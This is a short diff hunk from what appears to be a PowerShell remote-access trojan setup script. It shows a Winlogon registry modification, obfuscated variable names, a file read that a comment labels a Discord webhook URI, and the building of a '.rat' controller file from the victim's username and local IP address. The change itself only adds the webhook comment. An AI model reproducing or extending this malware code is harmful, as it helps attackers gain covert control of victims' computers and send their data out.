@@ -34,7 +34,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 # Variables
 # save current directory
 $fXmtFxsAMdGw = Get-Location|%{$_.Path}
-$QLxOhYDbSkv = Get-Content .\QqXjYbeWZoUhT.txt
+$QLxOhYDbSkv = Get-Content .\QqXjYbeWZoUhT.txt #discord webhook uri
 $rtsRfiZBxpGP = "$env:username.rat"
 $LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 #generate controller file
